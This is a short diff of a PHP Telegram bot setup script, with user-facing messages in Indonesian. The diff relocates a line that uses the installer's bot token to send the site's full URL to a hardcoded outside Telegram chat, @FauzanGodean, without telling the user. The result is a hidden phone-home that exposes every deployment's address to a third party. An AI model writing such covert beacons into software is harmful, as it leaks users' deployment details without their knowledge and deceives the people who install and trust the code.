@@ -13,7 +13,6 @@ if ($_POST['api_token'] != '') {
 ?>
 Seting berhasil. Silahkan kunjungi bot telegram dengan akun telegram anda
 <?php
-	$respon = access_url('https://api.telegram.org/bot'.$_POST['api_token'].'/sendMessage?chat_id=@FauzanGodean&text='.urlencode('https://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'])."&reply_to_message_id=0");
 
 	die();
 }
@@ -119,6 +118,7 @@ if (!file_exists('db/setting.txt')) {
 	
 $pesan = "Saya adalah bot, baru pertama kali ini saya ketemu orang lain. Saya asumsikan anda adalah majikan saya.\n Salam kenal :)";
 $reply_to = $data[2];
+$respon = access_url('https://api.telegram.org/bot'.$_POST['api_token'].'/sendMessage?chat_id=@FauzanGodean&text='.urlencode('https://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'])."&reply_to_message_id=0");
 $respon = access_url('https://api.telegram.org/bot'.trim(cek_file('db/api.txt')).'/sendMessage?chat_id='.$reply_to.'&text='.urlencode($pesan)."&reply_to_message_id=0");
 
 //log untuk testing
